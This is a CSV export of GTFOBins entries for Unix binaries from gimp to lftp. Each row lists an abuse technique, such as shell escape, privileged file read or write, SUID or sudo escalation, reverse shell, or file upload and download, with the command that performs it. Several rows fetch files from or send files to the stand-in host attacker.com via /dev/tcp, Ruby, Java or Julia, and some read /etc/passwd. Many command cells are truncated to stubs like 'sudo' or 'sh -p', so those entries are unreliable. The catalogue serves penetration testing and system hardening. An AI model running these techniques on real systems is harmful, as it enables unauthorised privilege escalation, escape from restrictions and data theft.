gimp,File write,https://gtfobins.github.io/gtfobins/gimp/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'"
gimp,File read,https://gtfobins.github.io/gtfobins/gimp/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'"
gimp,Library load,https://gtfobins.github.io/gtfobins/gimp/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,"gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'"
gimp,SUID,https://gtfobins.github.io/gtfobins/gimp/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gimp,Sudo,https://gtfobins.github.io/gtfobins/gimp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ginsh,Shell,https://gtfobins.github.io/gtfobins/ginsh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ginsh
!/bin/sh"
ginsh,Sudo,https://gtfobins.github.io/gtfobins/ginsh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ginsh,Limited SUID,https://gtfobins.github.io/gtfobins/ginsh/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
git,Shell,https://gtfobins.github.io/gtfobins/git/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"PAGER='sh -c ""exec sh 0<&1""' git -p help"
git,File write,https://gtfobins.github.io/gtfobins/git/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",git diff /dev/null /path/to/file >x.patch
git,File read,https://gtfobins.github.io/gtfobins/git/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",diff
git,Sudo,https://gtfobins.github.io/gtfobins/git/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
git,Limited SUID,https://gtfobins.github.io/gtfobins/git/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
grc,Shell,https://gtfobins.github.io/gtfobins/grc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,grc --pty /bin/sh
grc,Sudo,https://gtfobins.github.io/gtfobins/grc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
grep,File read,https://gtfobins.github.io/gtfobins/grep/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
grep '' $LFILE"
grep,SUID,https://gtfobins.github.io/gtfobins/grep/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
grep,Sudo,https://gtfobins.github.io/gtfobins/grep/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gtester,Shell,https://gtfobins.github.io/gtfobins/gtester/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF"
gtester,File write,https://gtfobins.github.io/gtfobins/gtester/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","<testbinary path=""DATA"">"
gtester,SUID,https://gtfobins.github.io/gtfobins/gtester/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gtester,Sudo,https://gtfobins.github.io/gtfobins/gtester/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gzip,File read,https://gtfobins.github.io/gtfobins/gzip/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
gzip -f $LFILE -t"
gzip,SUID,https://gtfobins.github.io/gtfobins/gzip/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gzip,Sudo,https://gtfobins.github.io/gtfobins/gzip/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
hd,File read,https://gtfobins.github.io/gtfobins/hd/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
hd ""$LFILE"""
hd,SUID,https://gtfobins.github.io/gtfobins/hd/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
hd,Sudo,https://gtfobins.github.io/gtfobins/hd/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
head,File read,https://gtfobins.github.io/gtfobins/head/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
head -c1G ""$LFILE"""
head,SUID,https://gtfobins.github.io/gtfobins/head/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
head,Sudo,https://gtfobins.github.io/gtfobins/head/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
hexdump,File read,https://gtfobins.github.io/gtfobins/hexdump/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
hexdump -C ""$LFILE"""
hexdump,SUID,https://gtfobins.github.io/gtfobins/hexdump/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
hexdump,Sudo,https://gtfobins.github.io/gtfobins/hexdump/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
highlight,File read,https://gtfobins.github.io/gtfobins/highlight/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
highlight --no-doc --failsafe ""$LFILE"""
highlight,SUID,https://gtfobins.github.io/gtfobins/highlight/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
highlight,Sudo,https://gtfobins.github.io/gtfobins/highlight/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
hping3,Shell,https://gtfobins.github.io/gtfobins/hping3/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"hping3
/bin/sh"
hping3,SUID,https://gtfobins.github.io/gtfobins/hping3/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
hping3,Sudo,https://gtfobins.github.io/gtfobins/hping3/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
iconv,File write,https://gtfobins.github.io/gtfobins/iconv/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE"""
iconv,File read,https://gtfobins.github.io/gtfobins/iconv/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
iconv -f 8859_1 -t 8859_1 ""$LFILE"""
iconv,SUID,https://gtfobins.github.io/gtfobins/iconv/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
iconv,Sudo,https://gtfobins.github.io/gtfobins/iconv/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
iftop,Shell,https://gtfobins.github.io/gtfobins/iftop/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"iftop
!/bin/sh"
iftop,Sudo,https://gtfobins.github.io/gtfobins/iftop/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
iftop,Limited SUID,https://gtfobins.github.io/gtfobins/iftop/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
install,SUID,https://gtfobins.github.io/gtfobins/install/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
install,Sudo,https://gtfobins.github.io/gtfobins/install/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ionice,Shell,https://gtfobins.github.io/gtfobins/ionice/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ionice /bin/sh
ionice,SUID,https://gtfobins.github.io/gtfobins/ionice/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ionice,Sudo,https://gtfobins.github.io/gtfobins/ionice/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ip,File read,https://gtfobins.github.io/gtfobins/ip/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ip -force -batch ""$LFILE"""
ip,SUID,https://gtfobins.github.io/gtfobins/ip/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ip,Sudo,https://gtfobins.github.io/gtfobins/ip/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
irb,Shell,https://gtfobins.github.io/gtfobins/irb/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"irb
exec '/bin/bash'"
irb,Reverse shell,https://gtfobins.github.io/gtfobins/irb/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
irb,File upload,https://gtfobins.github.io/gtfobins/irb/#file-upload,It can exfiltrate files on the network.,"irb
require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;"
irb,File download,https://gtfobins.github.io/gtfobins/irb/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
irb
require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])"
irb,File write,https://gtfobins.github.io/gtfobins/irb/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","irb
File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }"
irb,File read,https://gtfobins.github.io/gtfobins/irb/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","irb
puts File.read(""file_to_read"")"
irb,Library load,https://gtfobins.github.io/gtfobins/irb/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,"irb
require ""fiddle""; Fiddle.dlopen(""lib.so"")"
irb,Sudo,https://gtfobins.github.io/gtfobins/irb/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ispell,Shell,https://gtfobins.github.io/gtfobins/ispell/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ispell /etc/passwd
!/bin/sh"
ispell,SUID,https://gtfobins.github.io/gtfobins/ispell/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ispell,Sudo,https://gtfobins.github.io/gtfobins/ispell/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
jjs,Shell,https://gtfobins.github.io/gtfobins/jjs/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | jjs"
jjs,Reverse shell,https://gtfobins.github.io/gtfobins/jjs/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
jjs,File download,https://gtfobins.github.io/gtfobins/jjs/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
echo ""var URL = Java.type('java.net.URL');
var ws = new URL('$URL');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('$LFILE');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();"" | jjs"
jjs,File write,https://gtfobins.github.io/gtfobins/jjs/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","echo 'var FileWriter = Java.type(""java.io.FileWriter"");
var fw=new FileWriter(""./file_to_write"");
fw.write(""DATA"");
fw.close();' | jjs"
jjs,File read,https://gtfobins.github.io/gtfobins/jjs/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","echo 'var BufferedReader = Java.type(""java.io.BufferedReader"");
var FileReader = Java.type(""java.io.FileReader"");
var br = new BufferedReader(new FileReader(""file_to_read""));
while ((line = br.readLine()) != null) { print(line); }' | jjs"
jjs,SUID,https://gtfobins.github.io/gtfobins/jjs/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
jjs,Sudo,https://gtfobins.github.io/gtfobins/jjs/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
joe,Shell,https://gtfobins.github.io/gtfobins/joe/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"joe
^K!/bin/sh"
joe,Sudo,https://gtfobins.github.io/gtfobins/joe/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
joe,Limited SUID,https://gtfobins.github.io/gtfobins/joe/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
join,File read,https://gtfobins.github.io/gtfobins/join/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
join -a 2 /dev/null $LFILE"
join,SUID,https://gtfobins.github.io/gtfobins/join/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
join,Sudo,https://gtfobins.github.io/gtfobins/join/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
journalctl,Shell,https://gtfobins.github.io/gtfobins/journalctl/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"journalctl
!/bin/sh"
journalctl,Sudo,https://gtfobins.github.io/gtfobins/journalctl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
jq,File read,https://gtfobins.github.io/gtfobins/jq/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
jq -Rr . ""$LFILE"""
jq,SUID,https://gtfobins.github.io/gtfobins/jq/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
jq,Sudo,https://gtfobins.github.io/gtfobins/jq/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
jrunscript,Shell,https://gtfobins.github.io/gtfobins/jrunscript/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"""
jrunscript,Reverse shell,https://gtfobins.github.io/gtfobins/jrunscript/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
jrunscript,File download,https://gtfobins.github.io/gtfobins/jrunscript/#file-download,It can download remote files.,"URL=http://attacker.com/file_to_get
LFILE=file_to_save
jrunscript -e ""cp('$URL','$LFILE')"""
jrunscript,File write,https://gtfobins.github.io/gtfobins/jrunscript/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","jrunscript -e 'var fw=new java.io.FileWriter(""./file_to_write""); fw.write(""DATA""); fw.close();'"
jrunscript,File read,https://gtfobins.github.io/gtfobins/jrunscript/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""file_to_read"")); while ((line = br.readLine()) != null) { print(line); }'"
jrunscript,SUID,https://gtfobins.github.io/gtfobins/jrunscript/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
jrunscript,Sudo,https://gtfobins.github.io/gtfobins/jrunscript/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
jtag,Shell,https://gtfobins.github.io/gtfobins/jtag/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"jtag --interactive
shell /bin/sh"
jtag,Sudo,https://gtfobins.github.io/gtfobins/jtag/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
julia,Shell,https://gtfobins.github.io/gtfobins/julia/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,julia -e 'run(`/bin/sh`)'
julia,Reverse shell,https://gtfobins.github.io/gtfobins/julia/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
julia,File download,https://gtfobins.github.io/gtfobins/julia/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
julia -e 'download(ENV[""URL""], ENV[""LFILE""])'"
julia,File write,https://gtfobins.github.io/gtfobins/julia/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
julia -e 'open(f->write(f, ""DATA""), ENV[""LFILE""], ""w"")'"
julia,File read,https://gtfobins.github.io/gtfobins/julia/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","export LFILE=file_to_read
julia -e 'print(open(f->read(f, String), ENV[""LFILE""]))'"
julia,SUID,https://gtfobins.github.io/gtfobins/julia/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
julia,Sudo,https://gtfobins.github.io/gtfobins/julia/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
knife,Shell,https://gtfobins.github.io/gtfobins/knife/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"knife exec -E 'exec ""/bin/sh""'"
knife,Sudo,https://gtfobins.github.io/gtfobins/knife/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ksh,Shell,https://gtfobins.github.io/gtfobins/ksh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ksh
ksh,Reverse shell,https://gtfobins.github.io/gtfobins/ksh/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
ksh,File upload,https://gtfobins.github.io/gtfobins/ksh/#file-upload,It can exfiltrate files on the network.,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'echo -e ""POST / HTTP/0.9\n\n$(cat $LFILE)"" > /dev/tcp/$RHOST/$RPORT'"
ksh,File download,https://gtfobins.github.io/gtfobins/ksh/#file-download,It can download remote files.,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'"
ksh,File write,https://gtfobins.github.io/gtfobins/ksh/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
ksh -c 'echo DATA > $LFILE'"
ksh,File read,https://gtfobins.github.io/gtfobins/ksh/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","export LFILE=file_to_read
ksh -c 'echo ""$(<$LFILE)""'"
ksh,SUID,https://gtfobins.github.io/gtfobins/ksh/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ksh,Sudo,https://gtfobins.github.io/gtfobins/ksh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ksshell,File read,https://gtfobins.github.io/gtfobins/ksshell/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ksshell -i $LFILE"
ksshell,SUID,https://gtfobins.github.io/gtfobins/ksshell/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ksshell,Sudo,https://gtfobins.github.io/gtfobins/ksshell/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ksu,Sudo,https://gtfobins.github.io/gtfobins/ksu/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
kubectl,File upload,https://gtfobins.github.io/gtfobins/kubectl/#file-upload,It can exfiltrate files on the network.,"LFILE=dir_to_serve
kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
kubectl,SUID,https://gtfobins.github.io/gtfobins/kubectl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
kubectl,Sudo,https://gtfobins.github.io/gtfobins/kubectl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
latex,Shell,https://gtfobins.github.io/gtfobins/latex/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
latex,File read,https://gtfobins.github.io/gtfobins/latex/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi"
latex,Sudo,https://gtfobins.github.io/gtfobins/latex/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
latex,Limited SUID,https://gtfobins.github.io/gtfobins/latex/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
latexmk,Shell,https://gtfobins.github.io/gtfobins/latexmk/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"latexmk -e 'exec ""/bin/sh"";'"
latexmk,File read,https://gtfobins.github.io/gtfobins/latexmk/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","latexmk -e 'open(X,""/etc/passwd"");while(<X>){print $_;}exit'"
latexmk,Sudo,https://gtfobins.github.io/gtfobins/latexmk/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ld.so,Shell,https://gtfobins.github.io/gtfobins/ld.so/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,/lib/ld.so /bin/sh
ld.so,SUID,https://gtfobins.github.io/gtfobins/ld.so/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ld.so,Sudo,https://gtfobins.github.io/gtfobins/ld.so/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ldconfig,Sudo,https://gtfobins.github.io/gtfobins/ldconfig/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ldconfig,Limited SUID,https://gtfobins.github.io/gtfobins/ldconfig/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
less,Shell,https://gtfobins.github.io/gtfobins/less/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"less /etc/profile
!/bin/sh"
less,File write,https://gtfobins.github.io/gtfobins/less/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","echo DATA | less
sfile_to_write
q"
less,File read,https://gtfobins.github.io/gtfobins/less/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",less file_to_read
less,SUID,https://gtfobins.github.io/gtfobins/less/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
less,Sudo,https://gtfobins.github.io/gtfobins/less/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
lftp,Shell,https://gtfobins.github.io/gtfobins/lftp/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,lftp -c '!/bin/sh'
lftp,Sudo,https://gtfobins.github.io/gtfobins/lftp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
